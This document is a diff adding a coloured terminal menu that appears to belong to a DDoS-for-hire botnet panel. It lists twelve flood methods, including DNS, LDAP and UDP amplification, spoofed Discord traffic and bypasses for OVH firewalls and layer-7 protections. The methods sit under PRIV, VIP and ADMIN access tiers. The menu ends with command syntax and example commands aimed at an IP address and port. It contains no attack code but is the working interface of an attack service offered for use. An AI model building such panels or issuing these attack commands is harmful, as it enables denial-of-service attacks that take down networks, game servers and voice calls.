@@ -1,0 +1,21 @@
+{clear}[8;24;81t[38;5;39m┌─[97m[97m#[0m[38;5;39m───[97m\[97m[97m Name \[0m[38;5;39m────────[97m\[97m[97m Description \[0m[38;5;39m────────────────────────────────[38;5;39m[97m\[97m[97m Access \[0m[38;5;39m┐
+[38;5;39m│[97m--- ------------- -------------------------------------------- ---------------[38;5;39m│
+[38;5;39m│[97m 1  hold     DNS Amplification ICMP, DHCP Bypass Amplification Flood     [48;5;39m[97mPRIV[0m [38;5;39m│
+[38;5;39m│[97m 2  dns      DNS Amplification Flood With A Very Large Byte Size          [48;5;39m[97mAll[0m [38;5;39m│
+[38;5;39m│[97m 3  homekill LDAP Amplification Amplification Flood Preset Too 120s.      [48;5;39m[97mAll[0m [38;5;39m│
+[38;5;39m│[97m 4  game     UDP Amplification Mixed With UDP, STUN, VSE, 1 and 2 Headers [48;5;39m[97mAll[0m [38;5;39m│
+[38;5;39m│[97m 5  ovh      Optimized To Bypass OVH's Firewalls | Vectors "PSH, ACK"     [48;5;39m[97mAll[0m [38;5;39m│
+[38;5;39m│[97m 6  gudp     High Volume, Generic UDP Flood [97m[[38;5;46mHigh gbit/s[97m]                 [48;5;39m[97mVIP[0m [38;5;39m│
+[38;5;39m│[97m 7  discord  Spoofed Traffic Made For Bypassing Discord Calls.            [48;5;39m[97mVIP[0m [38;5;39m│
+[38;5;39m│[97m 8  tcp      Optimized For Bypassing TCP Targets                          [48;5;39m[97mVIP[0m [38;5;39m│
+[38;5;39m│[97m 9  bypass   Bypass Made For All L7 Protections, UAM, BROWSER, TLS, HTTP  [48;5;39m[97mVIP[0m [38;5;39m│
+[38;5;39m│[97m 10 udp-bot  Raw Generic udp Flood made for ether pps or gigs.           [48;5;39m[97mADMIN[0m[38;5;39m│ 
+[38;5;39m│[97m 11 tcp-bot  Raw Generic udp Flood made for ether pps or gigs.           [48;5;39m[97mADMIN[0m[38;5;39m│ 
+[38;5;39m│[97m 12 stopall  Stops All Attacks Ongoing, Via Spoofs. Only For Admin.      [48;5;39m[97mADMIN[0m[38;5;39m│
+[38;5;39m├──────────────────────────────────────────────────────────────────────────────┤
+[38;5;39m│[48;2;255;255;255m[30m                        Example For Sending Attacks                           [0m[38;5;39m│[97m
+[38;5;39m├──────────────────────────────────────────────────────────────────────────────┤
+[38;5;39m│[97m Preset[97m:  [38;5;39m[97mhold [38;5;39m<[97mtarget[38;5;39m> <[97mport[38;5;39m> [38;5;39m<[97mtime[38;5;39m>                                         [38;5;39m│
+[38;5;39m│[97m Example[97m: [38;5;39m[97mhold 70.70.70.7 53 120                                              [38;5;39m│
+[38;5;39m│[97m Raw Example[97m: [38;5;39m[97mudp-bot 70.70.70.7 53 30 len=1                                  [38;5;39m│
+[38;5;39m└──────────────────────────────────────────────────────────────────────────────┘[97m
